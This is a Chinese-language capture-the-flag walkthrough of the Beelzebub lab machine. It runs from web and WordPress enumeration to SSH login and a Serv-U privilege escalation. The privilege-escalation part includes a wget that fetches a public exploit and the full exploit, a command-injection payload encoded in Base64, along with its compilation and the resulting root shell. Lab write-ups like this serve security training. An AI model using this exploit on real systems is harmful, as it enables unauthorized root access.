+++
title = "Beelzebub: 1"
date = 2026-03-11
draft = false
weight = 1
+++

# Beelzebub
提示：You have to enumerate as much as you can and don't forget about the Base64.

## 识别目标主机IP地址
这里用LingJing实验室环境，实则不需要识别，一般Kali中指令如下：
```SHELL
sudo netdiscover -i eth1
ip addr
```
192.168.242.230

## NMAP扫描
利用NMAP对目标主机进行全端口扫描，
```zsh
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sS -sV -sC -T4 192.168.242.230 -oN nmap_full_scan 
Nmap scan report for 192.168.242.230
Host is up (0.00076s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE    VERSION
22/tcp open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 20:d1:ed:84:cc:68:a5:a7:86:f0:da:b8:92:3f:d9:67 (RSA)
|   256 78:89:b3:a2:75:12:76:92:2a:f9:8d:27:c1:08:a7:b9 (ECDSA)
|_  256 b8:f4:d6:61:cf:16:90:c5:07:18:99:b0:7c:70:fd:c0 (ED25519)
80/tcp open  tcpwrapped
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 235.55 seconds
```
（ps：关闭梯子），`-sS`是TCP SYN扫描（SYN“同步”，是TCP协议中的控制标志位，通过发送带有SYN标志位的TCP数据包到目标端口，根据接收到的响应类型，判断端口的开放状态，无需完成完整的三次握手），`-sV`是版本探测，`-sC`(Script)是默认脚本扫描，（`-p-`是全端口扫描，不用），（`-T4`(Timing Template)加快频率），`-oN namp_full_scan`(output noraml)将结果以标准格式保存到名为`nmap_full_scan`的文件中。
目标主机有2个开放端口22（SSH）、80（HTTP）

## 获得shell
目标主机openssh 7.6p1没有可利用的版本，接着分析80端口：
url中输入ip，返回apache2的默认页面，查看源代码没有特别发现

```ZSH
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.242.230/robots.txt
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at 192.168.242.230 Port 80</address>
</body></html>
```
目标站点不存在robots.txt文件，接着进行目录扫描：
```ZSH
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.242.230 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.242.230
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/javascript           (Status: 301) [Size: 323] [--> http://192.168.242.230/javascript/]
/phpmyadmin           (Status: 301) [Size: 323] [--> http://192.168.242.230/phpmyadmin/]
/server-status        (Status: 403) [Size: 280]
Progress: 220558 / 220558 (100.00%)
===============================================================
Finished
===============================================================
```
- `gobuster`是一个Go语言编写的高性能目录爆破工具，`dir`是目录扫描模式(枚举web服务器山过多隐藏目录、文件，向目标web服务器发送HTTP/HTTPS请求，接收服务器响应码判断目录/文件是否存在)，`-u`指定URL，`-w`(--wordlist)指定字典路径
- gobuster工具扫描出/javascript、/phpmyadmin目录

```zsh
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.242.230 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt,.sh,.html
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.242.230
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              txt,sh,html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10918]
/index.php            (Status: 200) [Size: 271]
/javascript           (Status: 301) [Size: 323] [--> http://192.168.242.230/javascript/]
/phpmyadmin           (Status: 301) [Size: 323] [--> http://192.168.242.230/phpmyadmin/]
/phpinfo.php          (Status: 200) [Size: 95447]
/server-status        (Status: 403) [Size: 280]
Progress: 1102790 / 1102790 (100.00%)
===============================================================
Finished
===============================================================
```
- `-x .php,.txt,.sh,.html`(-x全写是--extensions)这条命令拿着`directory-list-2.3-medium.txt`字典逐一尝试访问靶机，并给每个词条加上`.php`、`.txt`、`.sh`、`.html`后缀，如字典里的`admin`，会同时尝试`http://192.168.242.230/admin.php`、`http://192.168.242.230/admin.txt`、`http://192.168.242.230/admin.sh`、`http://192.168.242.230/admin.html`
- 状态码：200代表成功找到这个文件or页面，访问，如：`http://192.168.242.230/index.html`；301/302代表重定向，通常是真实存在的文件夹，可以访问；403被禁止，有权限看，但服务器不让进，记录下来，通常有敏感内容，需要后续绕过


- URL后缀加上`/index.php`，再F12查看页面源代码
```HTML
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<!--My heart was encrypted, "beelzebub" somehow hacked and decoded it.-md5-->
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.30 (Ubuntu)</address>
</body></html>
```
根据HTML注释中提示，提及了beelzebub和md5，暗示需要对beelzebub这个字符串进行MD5哈希加密

```ZSH
┌──(kali㉿kali)-[~]
└─$ echo -n 'beelzebub' | md5sum
d18e1e22becbd915b45e0e655429d487  -

┌──(kali㉿kali)-[~]
└─$ man echo | grep -e '-n'
       -n     do not output the trailing newline
```
- `-n`()确保计算的是纯粹的字符串`beelzebub`的哈希值，若不加，则echo在字符串末尾添加一个不可见的换行符，即计算的是`beelzebub\n`的哈希值
- 再用`man`(manual)手册查证细节，验证不产生换行符，`|`管道符串联前后命令，传递输出作为输入，`grep`是文本筛选工具，`-e`指定后续为匹配模式
- 将该值作为目标继续扫描

```ZSH
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.242.230/d18e1e22becbd915b45e0e655429d487 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.242.230/d18e1e22becbd915b45e0e655429d487
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/wp-content           (Status: 301) [Size: 356] [--> http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/wp-content/]
/wp-includes          (Status: 301) [Size: 357] [--> http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/wp-includes/]                                                                                                                        
/wp-admin             (Status: 301) [Size: 354] [--> http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/wp-admin/]
Progress: 220558 / 220558 (100.00%)
===============================================================
Finished
===============================================================
```
- 此时扫描出wordpress(WP)目录，说明在隐藏的MD5目录下，运行着一个完整的WordPress网站
- 接下来看是否可用wpscan扫描出用户名或者插件

```ZSH
┌──(kali㉿kali)-[~]
└─$ wpscan --url http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/ -e u,p
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.


Scan Aborted: The URL supplied redirects to http://192.168.1.6/d18e1e22becbd915b45e0e655429d487/. Use the --ignore-main-redirect option to ignore the redirection and scan the target, or change the --url option value to the redirected URL.
```
`-e`(--enumerate)，`u,p`(users,plugins)。WPScan报错，由于WordPress内部配置的Site URL与当前访问的IP不一致，目标服务器试图将我重定向到坐着原始环境的IP（`192.168.1.6`）,导致扫描中断，修改命令再尝试

```ZSH
┌──(kali㉿kali)-[~]
└─$ wpscan --url http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/ -e --plugins-detection aggressive --ignore-main-redirect --force
w_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/ [192.168.242.230]
[+] Started: Mon Jan 19 00:50:56 2026

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.29 (Ubuntu)
 |  - X-Redirect-By: WordPress
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.3.6 identified (Insecure, released on 2020-10-30).
 | Found By: Atom Generator (Aggressive Detection)
 |  - http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/index.php/feed/atom/, <generator uri="https://wordpress.org/" version="5.3.6">WordPress</generator>
 | Confirmed By: Style Etag (Aggressive Detection)
 |  - http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/wp-admin/load-styles.php, Match: '5.3.6'

[i] The main theme could not be detected.

[+] Enumerating Vulnerable Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:00:28 <=======================================> (7343 / 7343) 100.00% Time: 00:00:28

[i] No plugins Found.

[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:00 <=========================================> (652 / 652) 100.00% Time: 00:00:00

[i] No themes Found.

[+] Enumerating Timthumbs (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:02 <=======================================> (2568 / 2568) 100.00% Time: 00:00:02

[i] No Timthumbs Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <==========================================> (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] Enumerating DB Exports (via Passive and Aggressive Methods)
 Checking DB Exports - Time: 00:00:00 <================================================> (75 / 75) 100.00% Time: 00:00:00

[i] No DB Exports Found.

[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to "Plain" for those to be detected)
 Brute Forcing Attachment IDs - Time: 00:00:04 <=====================================> (100 / 100) 100.00% Time: 00:00:04

[i] Medias(s) Identified:

[+] http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/?attachment_id=38
 | Found By: Attachment Brute Forcing (Aggressive Detection)

[+] http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/?attachment_id=39
 | Found By: Attachment Brute Forcing (Aggressive Detection)

[+] http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/?attachment_id=42
 | Found By: Attachment Brute Forcing (Aggressive Detection)

[+] http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/?attachment_id=44
 | Found By: Attachment Brute Forcing (Aggressive Detection)

[+] http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/?attachment_id=48
 | Found By: Attachment Brute Forcing (Aggressive Detection)

[+] http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/?attachment_id=49
 | Found By: Attachment Brute Forcing (Aggressive Detection)

[+] http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/?attachment_id=51
 | Found By: Attachment Brute Forcing (Aggressive Detection)

[+] http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/?attachment_id=75
 | Found By: Attachment Brute Forcing (Aggressive Detection)

[+] http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/?attachment_id=74
 | Found By: Attachment Brute Forcing (Aggressive Detection)

[+] http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/?attachment_id=77
 | Found By: Attachment Brute Forcing (Aggressive Detection)

[+] http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/?attachment_id=96
 | Found By: Attachment Brute Forcing (Aggressive Detection)

[+] http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/?attachment_id=99
 | Found By: Attachment Brute Forcing (Aggressive Detection)

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <===========================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] valak
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] krampus
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon Jan 19 00:51:58 2026
[+] Requests Done: 10929
[+] Cached Requests: 11
[+] Data Sent: 3.643 MB
[+] Data Received: 1.627 MB
[+] Memory used: 206.777 MB
[+] Elapsed time: 00:01:01
```
- `-e`是`--enumerate`的缩写，告诉WPScan区枚举慕白哦网站的特定信息；`--ignore-main-redirect`强制WPScan忽略服务器发出的重定向请求；`--plugins-detection aggressive`深度探测，默认探测只看页面源代码，积极模式会主动请求插件路径；`--force`强制执行，WPScan忽略一些非致命的警告
- `wpscan --url http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/ -e --plugins-detection aggressive --ignore-main-redirect --force`，其中`--plugins-detection aggressive`针对插件，而没有用`--users-detection aggressive`针对用户账号，可以同时用`--users-detection aggressive --plugins-detection aggressive`实现激进枚举用户+激进枚举插件，但会增加耗时。
- 得到合法的后台用户名`valak`和`krampus`，只要匹配密码就可登录。

接着检查/wp-content/uploads/有无相关文件http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/wp-content/uploads/
结果发现一个`Talk To VALAK/`文件夹，F12进入网络模式，输入任意一个数字，返回的状态200，方法post，文件index.php，其返回的cookie中含有密码

```
M4k3Ad3a1
```

尝试登录
```ZSH
┌──(kali㉿kali)-[~]
└─$ ssh krampus@192.168.242.230
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
krampus@192.168.242.230's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 5.3.0-53-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

294 packages can be updated.
178 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Your Hardware Enablement Stack (HWE) is supported until April 2023.
Last login: Wed Jun 11 17:35:43 2025 from 192.168.188.6
krampus@beelzebub:~$
```
成功登录

## 提权
```ZSH
krampus@beelzebub:~$ cat .Serv-U-Tray.conf
Theme Number0krampus@beelzebub:~$ -U Tray\Themes
krampus@beelzebub:~$ cat .bash_history
mysql -u root -p
clear
su root
clear
lks
ls
clear
nano /etc/host
nano /etc/hosts # 系统本地的 DNS 映射表，可以绕过公共DNS解析、测试本地站点、屏蔽恶意网站
su root # 切换到root超级用户身份
su root
rm -rf sudo-1.9.6p1 sudo-1.9.6p1.tar.gz wordpress-5.3.2.zip 
su root
clear
exit
chmod 0750 html/
ifconfig
cd /var/lib/mysql/
clear
ls
cd wordpress/
sudo su
su root
clear
ls
cd Desktop/
clear
ls
cat user.txt 
clear
uname -a
sudo -1
sudo -i
clear
uname -a
sudo -i
find / -prem -u=s -type f 2>/dev/null
find / -prem -u=s -type f 2>/dev/null
cat /etc/issue
sudo -l
cd
cd ../
cd ../../../../
clear
find / -prem -u=s -type f 2>/dev/null
cd /usr/local/Serv-U/
ls
cd
clear
ps -aux
ps -a
ps -a -U root
ps -a -U root | grep 'Serv'
ps -U root -au
ps -U root -au | sort -u
clear
cd /tmp/
clear
find / -prem -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
clear
find / -perm -u=s -type f 2>/dev/null
clear
wget https://www.exploit-db.com/download/47009
clear
ls
clear
mv 47009 ./exploit.c # mv可以移动或重命名，./表示当前目录，exploit.c是新的文件名，即将47009重命名为当前目录下的exploit.c
gcc exploit.c -o exploit
./exploit 
cd ../../../../../../../
ls
cd cd
cd
grep -r 'beelzebub'
grep -r 'love'
cd .local/share
clear
ls
cd Trash/
ls
cat info
cd info
ls
ls -la
cd ../
clear
cd ../
ls
rm -rf Trash/
clear
su root
history -R
history -r
mysql -u root -p
clear
su root
clear
lks
ls
clear
nano /etc/host
nano /etc/hosts
su root
su root
rm -rf sudo-1.9.6p1 sudo-1.9.6p1.tar.gz wordpress-5.3.2.zip 
su root
clear
exit
history
clear
cd
clear
ip link
su root
clear
ls
history
clear
ls
cd /tmp/
ls
su root
exit
clear
cat /etc/systemd/system/LingJingCmd.service
vi /etc/network/interfaces
su root
ip addr
su root
quit
help
exit
exit
```
- 第一个命令查看`.Serv-U-Tray.conf`的隐藏配置文件内容，Serv-U是一款非常著名的FTP服务器软件
- `-U Tray\Themes `不是一个有效的命令，由于上一个`cat`命令输出的内容没有换行，导致命令提示符紧跟在内容后面，
- 第二个命令查看当前用户`krampus`的命令历史记录，得知目标运行servU，且在历史记录中找到了漏洞利用代码的位置

```
wget https://www.exploit-db.com/download/47009
```
- 将文件下载到kali linux的`/home/kali`（或者用波浪号`~`表示），再将文件名字修改为`47009.c`
- 由于kali linux的ip为`192.168.203.129`，而靶机ip为lingjing实验室环境分配的`192.168.242.230`，两者网段不匹配，因此可以采用绕过回传限制的方法，**Base64编码**
```zsh
┌──(kali㉿kali)-[~]
└─$ base64 47009.c -w 0
LyoNCg0KQ1ZFLTIwMTktMTIxODEgU2Vydi1VIDE1LjEuNiBQcml2aWxlZ2UgRXNjYWxhdGlvbiANCg0KdnVsbmVyYWJpbGl0eSBmb3VuZCBieToNCkd1eSBMZXZpbiAoQHZhX3N0YXJ0IC0gdHdpdHRlci5jb20vdmFfc3RhcnQpIGh0dHBzOi8vYmxvZy52YXN0YXJ0LmRldg0KDQp0byBjb21waWxlIGFuZCBydW46DQpnY2Mgc2VydnUtcGUtY3ZlLTIwMTktMTIxODEuYyAtbyBwZSAmJiAuL3BlDQoNCiovDQoNCiNpbmNsdWRlIDxzdGRpby5oPg0KI2luY2x1ZGUgPHVuaXN0ZC5oPg0KI2luY2x1ZGUgPGVycm5vLmg+DQoNCmludCBtYWluKCkNCnsgICAgICAgDQogICAgY2hhciAqdnVsbl9hcmdzW10gPSB7IlwiIDsgaWQ7IGVjaG8gJ29wZW5pbmcgcm9vdCBzaGVsbCcgOyAvYmluL3NoOyBcIiIsICItcHJlcGFyZWluc3RhbGxhdGlvbiIsIE5VTEx9Ow0KICAgIGludCByZXRfdmFsID0gZXhlY3YoIi91c3IvbG9jYWwvU2Vydi1VL1NlcnYtVSIsIHZ1bG5fYXJncyk7DQogICAgLy8gaWYgZXhlY3YgaXMgc3VjY2Vzc2Z1bCwgd2Ugd29uJ3QgcmVhY2ggaGVyZQ0KICAgIHByaW50ZigicmV0IHZhbDogJWQgZXJybm86ICVkXG4iLCByZXRfdmFsLCBlcnJubyk7DQogICAgcmV0dXJuIGVycm5vOw0KfQ==  
```
`-w`全写`--wrap`，指定编码后每行最多多少字符，而`0`表示不换行（禁用自动换行），输出的Base64字符串是一整行

在靶机krampus的shell中运行：
```ZSH
krampus@beelzebub:~$ cd /tmp
krampus@beelzebub:/tmp$ echo "LyoNCg0KQ1ZFLTIwMTktMTIxODEgU2Vydi1VIDE1LjEuNiBQcml2aWxlZ2UgRXNjYWxhdGlvbiANCg0KdnVsbmVyYWJpbGl0eSBmb3VuZCBieToNCkd1eSBMZXZpbiAoQHZhX3N0YXJ0IC0gdHdpdHRlci5jb20vdmFfc3RhcnQpIGh0dHBzOi8vYmxvZy52YXN0YXJ0LmRldg0KDQp0byBjb21waWxlIGFuZCBydW46DQpnY2Mgc2VydnUtcGUtY3ZlLTIwMTktMTIxODEuYyAtbyBwZSAmJiAuL3BlDQoNCiovDQoNCiNpbmNsdWRlIDxzdGRpby5oPg0KI2luY2x1ZGUgPHVuaXN0ZC5oPg0KI2luY2x1ZGUgPGVycm5vLmg+DQoNCmludCBtYWluKCkNCnsgICAgICAgDQogICAgY2hhciAqdnVsbl9hcmdzW10gPSB7IlwiIDsgaWQ7IGVjaG8gJ29wZW5pbmcgcm9vdCBzaGVsbCcgOyAvYmluL3NoOyBcIiIsICItcHJlcGFyZWluc3RhbGxhdGlvbiIsIE5VTEx9Ow0KICAgIGludCByZXRfdmFsID0gZXhlY3YoIi91c3IvbG9jYWwvU2Vydi1VL1NlcnYtVSIsIHZ1bG5fYXJncyk7DQogICAgLy8gaWYgZXhlY3YgaXMgc3VjY2Vzc2Z1bCwgd2Ugd29uJ3QgcmVhY2ggaGVyZQ0KICAgIHByaW50ZigicmV0IHZhbDogJWQgZXJybm86ICVkXG4iLCByZXRfdmFsLCBlcnJubyk7DQogICAgcmV0dXJuIGVycm5vOw0KfQ==" | base64 -d > /tmp/47009.c

krampus@beelzebub:/tmp$ ls -l /tmp/47009.c
-rw-rw-r-- 1 krampus krampus 619 Jun 11 18:23 /tmp/47009.c

krampus@beelzebub:/tmp$ gcc -o exploit 47009.c
krampus@beelzebub:/tmp$ ./exploit
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare),1000(krampus)
opening root shell
# cd /root
# ls
root.txt
# cat root.txt
8955qpasq8qq807879p75e1rr24cr1a5
```
- `gcc`是linux的c语言编译器，`-o`是输出参数，`exploit`是生成的文件名字，源代码是`47009.c`
- `./exploit`是运行当前目录下可执行文件，`.`代表"当前所在的目录"，`/`代表路径分隔符
- `uid=0(root)`代表身份是超级管理员，`gid=0(root)`代表现在属于root管理组，`groups`显示除了root组外，还保留原用户`krampus`所在的组（`adm`，`cdrom`，`sudo`），这是因为提权脚本劫持父进程权限，在当前会话中产生了一个具有root权限的子shell
- `opening root shell`是`47009.c`脚本中`printf`函数输出的一行文字，命令提示符从`$`变为`#`，代表root
- 接着读取/root/root.txt中的root flag